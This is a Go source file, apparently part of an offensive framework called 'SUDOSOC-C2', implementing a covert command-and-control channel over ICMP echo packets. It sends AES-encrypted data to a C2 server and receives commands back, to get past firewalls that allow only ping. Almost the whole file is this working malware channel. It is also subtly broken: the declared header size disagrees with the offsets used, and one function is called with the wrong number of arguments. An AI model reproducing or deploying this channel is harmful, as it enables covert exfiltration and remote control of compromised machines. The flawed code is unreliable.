package icmp

/*
	SUDOSOC-C2 — ICMP Covert Channel
	Copyright (C) 2026  sudosoc — Seif

	C2 over ICMP ping packets.
	Works in environments that block all TCP/UDP but allow ping.

	Protocol:
	  Data is split into 8-byte chunks encoded in ICMP Echo payload.
	  Each packet has a 4-byte sequence number + 4-byte session ID.
	  The C2 server responds with ICMP Echo Reply carrying commands.

	Encoding:
	  [4B: magic 0xDEAD5E1F][4B: session_id][4B: seq][4B: total]
	  [4B: chunk_index][2B: payload_len][payload: up to 1400 bytes]

	Encryption: AES-256-GCM on the entire payload field.

	Requires raw socket privileges (root/admin or CAP_NET_RAW).
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"time"
)

const (
	icmpMagic      = uint32(0xDEAD5E1F)
	headerSize     = 18  // 4+4+4+4+2
	maxPayloadSize = 1400 // bytes per ICMP packet

	// ICMP types
	icmpEchoRequest = 8
	icmpEchoReply   = 0
)

// ICMPC2 manages C2 communication over ICMP
type ICMPC2 struct {
	ServerIP  net.IP
	SessionID uint32
	AESKey    []byte
	conn      net.PacketConn
	seqNum    uint32
	mu        sync.Mutex
	recvBuf   map[uint32]*assembler // seq → assembler
}

type assembler struct {
	total   uint32
	chunks  map[uint32][]byte
	created time.Time
}

// NewICMPC2 creates a new ICMP C2 channel
func NewICMPC2(serverIP string, sessionID uint32, aesKey []byte) (*ICMPC2, error) {
	ip := net.ParseIP(serverIP)
	if ip == nil {
		return nil, fmt.Errorf("invalid IP: %s", serverIP)
	}

	c := &ICMPC2{
		ServerIP:  ip,
		SessionID: sessionID,
		AESKey:    aesKey,
		recvBuf:   make(map[uint32]*assembler),
	}

	// Open raw ICMP socket
	conn, err := net.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return nil, fmt.Errorf("raw socket (need root/admin): %v", err)
	}
	c.conn = conn

	return c, nil
}

// Send transmits data to the C2 server via ICMP echo requests
func (c *ICMPC2) Send(data []byte) error {
	encrypted, err := c.encrypt(data)
	if err != nil {
		return err
	}

	// Split into chunks
	chunks := splitChunks(encrypted, maxPayloadSize)
	total := uint32(len(chunks))

	c.mu.Lock()
	baseSeq := c.seqNum
	c.seqNum += total
	c.mu.Unlock()

	for i, chunk := range chunks {
		pkt := c.buildPacket(baseSeq, total, uint32(i), chunk)
		icmpPkt := buildICMP(icmpEchoRequest, 0, uint16(baseSeq&0xFFFF), pkt)

		_, err := c.conn.WriteTo(icmpPkt, &net.IPAddr{IP: c.ServerIP})
		if err != nil {
			return fmt.Errorf("send chunk %d: %v", i, err)
		}
		// Slight delay to avoid dropping packets
		time.Sleep(5 * time.Millisecond)
	}
	return nil
}

// Receive waits for and assembles a complete message from the C2 server
func (c *ICMPC2) Receive(timeout time.Duration) ([]byte, error) {
	deadline := time.Now().Add(timeout)
	c.conn.SetReadDeadline(deadline)

	buf := make([]byte, 65535)
	for time.Now().Before(deadline) {
		n, _, err := c.conn.ReadFrom(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				return nil, nil // timeout, no data
			}
			return nil, err
		}

		// Parse IP header (20 bytes) + ICMP
		if n < 20+8 {
			continue
		}
		icmpData := buf[20:n]

		// Check ICMP type = Echo Reply
		if icmpData[0] != icmpEchoReply {
			continue
		}

		payload := icmpData[8:] // skip ICMP header
		if len(payload) < headerSize {
			continue
		}

		// Validate magic
		if binary.BigEndian.Uint32(payload[0:4]) != icmpMagic {
			continue
		}

		sessionID := binary.BigEndian.Uint32(payload[4:8])
		if sessionID != c.SessionID {
			continue
		}

		seq   := binary.BigEndian.Uint32(payload[8:12])
		total := binary.BigEndian.Uint32(payload[12:16])
		chunk := binary.BigEndian.Uint32(payload[16:20])
		plen  := binary.BigEndian.Uint16(payload[20:22])
		data  := payload[22 : 22+int(plen)]

		// Assemble
		if assembled := c.assembleChunk(seq, total, chunk, data); assembled != nil {
			return c.decrypt(assembled)
		}
	}
	return nil, nil
}

// Close closes the ICMP socket
func (c *ICMPC2) Close() error {
	if c.conn != nil {
		return c.conn.Close()
	}
	return nil
}

// ── Internal ──────────────────────────────────────────────────────

func (c *ICMPC2) buildPacket(seq, total, chunkIdx uint32, data []byte) []byte {
	buf := make([]byte, headerSize+len(data))
	binary.BigEndian.PutUint32(buf[0:4], icmpMagic)
	binary.BigEndian.PutUint32(buf[4:8], c.SessionID)
	binary.BigEndian.PutUint32(buf[8:12], seq)
	binary.BigEndian.PutUint32(buf[12:16], total)
	binary.BigEndian.PutUint32(buf[16:20], chunkIdx)
	binary.BigEndian.PutUint16(buf[20:22], uint16(len(data)))
	copy(buf[22:], data)
	return buf
}

func (c *ICMPC2) assembleChunk(seq, total, chunkIdx uint32, data []byte) []byte {
	c.mu.Lock()
	defer c.mu.Unlock()

	if _, ok := c.recvBuf[seq]; !ok {
		c.recvBuf[seq] = &assembler{
			total:   total,
			chunks:  make(map[uint32][]byte),
			created: time.Now(),
		}
	}
	asm := c.recvBuf[seq]
	asm.chunks[chunkIdx] = make([]byte, len(data))
	copy(asm.chunks[chunkIdx], data)

	if uint32(len(asm.chunks)) == asm.total {
		var result []byte
		for i := uint32(0); i < asm.total; i++ {
			result = append(result, asm.chunks[i]...)
		}
		delete(c.recvBuf, seq)
		return result
	}
	return nil
}

func splitChunks(data []byte, size int) [][]byte {
	var chunks [][]byte
	for len(data) > 0 {
		end := size
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[:end])
		data = data[end:]
	}
	return chunks
}

func buildICMP(typ, code byte, id, seq uint16, payload []byte) []byte {
	// ICMP header: type(1) + code(1) + checksum(2) + id(2) + seq(2)
	pkt := make([]byte, 8+len(payload))
	pkt[0] = typ
	pkt[1] = code
	binary.BigEndian.PutUint16(pkt[4:6], id)
	binary.BigEndian.PutUint16(pkt[6:8], seq)
	copy(pkt[8:], payload)

	// Compute checksum
	cs := icmpChecksum(pkt)
	binary.BigEndian.PutUint16(pkt[2:4], cs)
	return pkt
}

func icmpChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xFFFF)
	sum += sum >> 16
	return uint16(^sum)
}

func (c *ICMPC2) encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(c.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (c *ICMPC2) decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(c.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}
